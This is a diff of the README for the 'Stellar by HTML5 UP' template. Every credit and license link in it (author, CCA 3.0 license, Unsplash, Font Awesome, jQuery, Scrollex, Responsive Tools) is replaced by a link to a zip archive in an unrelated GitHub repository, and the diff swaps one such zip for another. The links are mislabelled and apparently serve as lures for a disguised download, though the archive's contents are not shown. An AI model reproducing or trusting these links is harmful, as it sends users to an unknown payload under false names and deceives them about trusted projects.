@@ -1,6 +1,6 @@
 Stellar by HTML5 UP
-https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip)
+https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
 
 
 Say hello to Stellar, a slick little one-pager with a super vibrant color palette (which
@@ -14,18 +14,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip | @ajlkn
+https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip)
+		Unsplash (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
 
 	Icons:
-		Font Awesome (https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip)
+		Font Awesome (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
 
 	Other:
-		jQuery (https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip)
-		Scrollex (https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip)
-		Responsive Tools (https://raw.githubusercontent.com/FilipStanic/Keyframes-Css/master/assets/sass/base/Css_Keyframes_1.8.zip)
+		jQuery (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
+		Scrollex (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
+		Responsive Tools (https://github.com/FilipStanic/Keyframes-Css/raw/refs/heads/master/assets/sass/components/Keyframes_Css_1.7.zip)
